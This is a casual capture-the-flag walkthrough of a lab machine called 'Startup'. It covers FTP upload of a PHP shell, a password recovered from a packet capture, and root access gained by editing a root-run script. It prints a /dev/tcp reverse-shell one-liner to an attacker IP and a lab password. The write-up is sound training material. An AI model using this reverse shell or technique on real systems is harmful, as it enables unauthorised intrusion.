# Startup
**We are Spice Hut,** a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

**Questions**
- What is the secret spicy soup recipe?
- What are the contents of user.txt?
- What are the contents of root.txt?

- First, I will use nmap to find open ports and service versions
- Command : `nmap -sV -sC 10.10.196.55`

![[Pasted image 20251005212331.png]]

- anonymous FTP login allowed! we should try that first (and also, anyone can read notice.txt file)
- Command : `ftp 10.10.196.55` and type username as anonymous

![[Pasted image 20251005212854.png]]

- then, i used "get" command to download notice.txt and important.jpg files. 

![[Pasted image 20251005213201.png]]

- amongus mentioned huh

![[Pasted image 20251005213309.png]]

- lolll what is this
- for now, lets access the website and use gobuster to enumerate the directories

![[Pasted image 20251005213916.png]]

![[Pasted image 20251005213935.png]]

- they are the same as the ones we found in ftp so they're not really helpful
- But wait...what if we **upload a payload to FTP server**, and then it will be **appeared in the website**? Good idea isnt it? we can try that

![[Pasted image 20251005222736.png]]

- why not?
- Ohh its becuase we dont have permissions to write files there! ( we are anonymous )
- remember, there is a **ftp folder** which can be r,w,x by anyone, so i will go to that directory to create tmp directory so that we can upload files to there

![[Pasted image 20251005223031.png]]

![[Pasted image 20251005223102.png]]

- ok we just uploaded php file there
- now, set a listener and then execute the php file

![[Pasted image 20251005223236.png]]

- wooo we gained access!
- now, lets see the list of users

![[Pasted image 20251005223337.png]]

- vagrant,lennie and ftpsecure

![[Pasted image 20251005223515.png]]

- i found recipe in root directory

![[Pasted image 20251005223551.png]]

- Um i have no words, but anyway we got the first answer to the question, which is "love"
- Anyway in home directory, there is another suspicious directory called "incidents"

![[Pasted image 20251005223936.png]]
 
![[Pasted image 20251005223956.png]]

- there is a sus pcap that has the owner as "www-data", is it related to wireshark?
- lets transfer file from target to here for further investigation
- Command target :  `python2 -m SimpleHTTPServer 8000`
- Command attacker : `wget http://10.10.196.55:8000/suspicious.pcapng -O suspicious.pcapng`
- Then i open wireshark on attacker machine : `wireshark suspicious.pcapng`

![[Pasted image 20251005225535.png]]

![[Pasted image 20251005225824.png]]

- where is 192.168.22.139 ? it seems to be the captures from that interface

*/*/r 17:40:21 up 20 min,  1 user,  load average: 0.00, 0.03, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         17:21    1:09   0.54s  0.54s -bash

- user vagrant, lets try to see what he does 
- `python -c "import pty;pty.spawn('/bin/bash')"`
- seems like hes doing priv escalation
- At line 152, he is trying to access lennie's folder

![[Pasted image 20251005230758.png]]

- then he tried sudo -l and entered pass for www-data
- c4ntg3t3n0ughsp1c3 is the INCORRECT password for www-data that vagrant typed, but is it the password for lennie or vagrant? lets try logging in via ssh
- `ssh lennie@10.10.196.55`

![[Pasted image 20251005231925.png]]

- it worked! whattt
- and i got the flag!
- now, lets try doing privilege escalation for root

![[Pasted image 20251005232747.png]]

- there are 2 directories in lennie's home dir, lets examine both

![[Pasted image 20251005232915.png]]

- planner.sh is owned by root and can be executed by ithers (including lennie)
- lets examine **/etc/print.sh**

![[Pasted image 20251005233048.png]]

- its owned by lennie, so we can r,w,x this file

![[Pasted image 20251005233118.png]]

- we can add a line to execute a bash shell here
- `/bin/bash -i >& /dev/tcp/10.23.125.244/4444 0>&1`

![[Pasted image 20251006000733.png]]

- but how to make root run the planner file since we can execute planner.sh?

![[Pasted image 20251006000718.png]]

- so i started a listener on port 4444 cuz i thought when we execute this, we will get the bash back but seems like we dont even have to execute it! It somehow executes automatically, maybe because of crons? but i already checked and theres nothing tho

![[Pasted image 20251006001110.png]]

- got the root flag
